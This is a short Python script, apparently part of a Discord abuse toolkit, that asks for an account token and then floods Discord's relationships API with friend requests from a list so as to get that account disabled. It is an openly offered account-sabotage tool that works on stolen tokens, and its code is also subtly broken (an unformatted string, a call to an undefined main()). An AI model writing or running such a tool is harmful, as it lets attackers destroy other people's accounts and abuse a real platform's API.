import requests
import os
from colorama import Fore


def disable():
    print(f""" Enter account token to disable""")
    usertoken = str(input(f""" Token: """))
    headers = {'Authorization': usertoken, 'Content-Type': 'application/json'}
    res = requests.get('https://discord.com/api/v8/users/@me', headers=headers).json()
    print(" User Details: {res['username']}#{res['discriminator']} - ({res['id']})")
    input(" If These Details Are Correct Press Enter! (This Will Start Disbaling The Account)")
    print()
    for username in open('util/11_AccountDisabler/users.txt', 'r').read().splitlines():
        try:
            usr = username.split('#')
            r = requests.post('https://discord.com/api/v8/users/@me/relationships', headers=headers, json={'username': usr[0], 'discriminator': usr[1]})
            print("Added!")
        except:
            print("Something Went Wrong!")
    print("Account successfully disable")
    input("""Press ENTER to exit""")
    main()

disable()